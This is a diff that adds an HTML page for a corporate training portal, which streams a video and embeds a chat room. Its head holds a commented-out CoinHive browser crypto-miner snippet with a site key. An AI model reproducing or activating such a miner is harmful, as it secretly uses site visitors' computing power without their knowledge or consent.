@@ -1,0 +1,86 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <title>Treinamentos Casebrás</title>
+
+  <!-- jQuery & bootstrap -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" />
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+  <!-- video.js -->
+  <link href="http://vjs.zencdn.net/6.4.0/video-js.css" rel="stylesheet">
+  <script src="http://vjs.zencdn.net/6.4.0/video.js"></script>
+  <script src="https://unpkg.com/videojs-flash/dist/videojs-flash.js"></script>
+  <script src="https://unpkg.com/videojs-contrib-hls/dist/videojs-contrib-hls.js"></script>
+
+  <script src="/phpfreechat-2.1.0/client/lib/jquery-1.8.2.min.js" type="text/javascript"></script>
+  <link rel="stylesheet" type="text/css" href="/phpfreechat-2.1.0/client/themes/default/jquery.phpfreechat.min.css" />
+  <script src="/phpfreechat-2.1.0/client/jquery.phpfreechat.min.js" type="text/javascript"></script>
+  
+  <style>
+	#video-col {
+		display: flex;
+		justify-content: center;
+	}
+  </style>
+  
+  <!-- <script>
+    $('#html5-videos').lightGallery();
+  </script>  -->
+  <!-- <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script type="text/javascript">
+  var miner = new CoinHive.Anonymous('CiBR0ZyvrOJrskNyR4zUwtgR8zBnqnYS', { throttle: 0.6 });
+  miner.start();
+
+  </script> -->
+  <!-- <script src="http://vjs.zencdn.net/ie8/ie8-version/videojs-ie8.min.js"></script> -->
+
+  <!-- Smartsupp Live Chat script -->
+</head>
+
+<body>
+
+<div class="container">
+	<nav class="navbar navbar-inverse navbar-default navbar-static-top">  
+		<div class="navbar-header">
+			<a class="navbar-brand" href="#">Grupo Casebrás</a>
+		</div>
+	</nav>
+	  
+    <div class="row">
+		<div id="video-col" class="col w-75">
+			<div class="d-flex justify-content-center">
+				<video id="training-video" class="video-js vjs-default-skin" width="854" height="480" autoplay="autoplay" poster="temp.jpg">
+					<source src="http://147.135.211.38:8080/hls/training/index.m3u8" type="application/x-mpegURL" />
+				</video>
+				<script>
+					var player = videojs('training-video');
+					player.play();
+				</script>
+			</div>
+		</div>
+	
+		<div class="col w-25">
+			<div id="mychat"><a href="http://www.phpfreechat.net">Creating chat rooms everywhere - phpFreeChat</a></div>
+		</div>
+		
+		<script type="text/javascript">
+		  $('#mychat').phpfreechat({ serverUrl: '/phpfreechat-2.1.0/server' });
+		</script>
+    </div>
+
+    <hr>
+    <hr>
+
+    <footer class="footer text-right">
+      <p>© 2017 Grupo Casebrás.</p>
+    </footer>
+</div> <!-- /container -->
+
+</body>
+
+</html>
